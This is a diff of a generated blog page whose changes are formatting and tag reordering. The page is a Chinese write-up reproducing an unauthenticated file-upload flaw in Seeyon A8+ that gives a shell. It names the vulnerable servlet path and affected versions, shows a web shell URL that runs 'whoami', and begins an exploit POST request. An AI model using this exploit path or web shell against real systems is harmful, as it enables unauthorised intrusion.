@@ -259,22 +259,22 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="0x00-漏洞详情"><a href="#0x00-漏洞详情" class="headerlink" title="0x00 漏洞详情"></a>0x00 漏洞详情</h1><blockquote>
+    <h1><span id="0x00-漏洞详情">0x00 漏洞详情</span></h1><blockquote>
 <p>今年6月，360CERT 监测到致远 A8+ 某些版本系统，存在远程任意文件上传文件上传漏洞，并且无需登录即可触发。攻击者构造恶意文件，成功利用漏洞后可造成Getshell</p>
 </blockquote>
-<h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><ul>
+<h1><span id="0x01-影响版本">0x01 影响版本</span></h1><ul>
 <li>致远A8-V5协同管理软件 V6.1sp1</li>
 <li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
 <li>致远A8+协同管理软件 V7.1</li>
 </ul>
-<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p> 一，访问漏洞路径<br> <code>/seeyon/htmlofficeservlet</code></p>
+<h1><span id="0x02-漏洞利用">0x02 漏洞利用</span></h1><p> 一，访问漏洞路径<br> <code>/seeyon/htmlofficeservlet</code></p>
 <p> 出现如下内容则表示存在漏洞</p>
 <p> <img src="/images/10/1.png" alt></p>
 <p> 二，使用Burp抓包，上EXP</p>
 <p>  <img src="/images/10/2.png" alt></p>
 <p> 三，调用命令执行<br>访问<code>/test123456.jsp?pwd=asasd3344&amp;cmd=cmd%20+/c+whoami</code></p>
 <p> <img src="/images/10/3.png" alt></p>
-<h1 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h1><pre class="line-numbers language-python"><code class="language-python">POST <span class="token operator">/</span>seeyon<span class="token operator">/</span>htmlofficeservlet HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<h1><span id="0x03-exp">0x03 EXP</span></h1><pre class="line-numbers language-python"><code class="language-python">POST <span class="token operator">/</span>seeyon<span class="token operator">/</span>htmlofficeservlet HTTP<span class="token operator">/</span><span class="token number">1.1</span>
 Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">1121</span>
 User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">4.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">6.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">5.1</span><span class="token punctuation">;</span> SV1<span class="token punctuation">)</span>
 Host<span class="token punctuation">:</span> xxxxxxxxx
@@ -428,7 +428,7 @@ originalCreateDate<span class="token operator">=</span>wLSGP4oEzLKAz4<span class
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-漏洞详情"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞详情</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-影响版本"><span class="toc-number">2.</span> <span class="toc-text">0x01 影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">4.</span> <span class="toc-text">0x03 EXP</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞详情</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">0x01 影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">4.</span> <span class="toc-text">0x03 EXP</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -568,6 +568,10 @@ originalCreateDate<span class="token operator">=</span>wLSGP4oEzLKAz4<span class
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
@@ -576,11 +580,11 @@ originalCreateDate<span class="token operator">=</span>wLSGP4oEzLKAz4<span class
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">免杀</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -588,19 +592,11 @@ originalCreateDate<span class="token operator">=</span>wLSGP4oEzLKAz4<span class
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
               </li>
              
               <li class="article-tag-list-item">
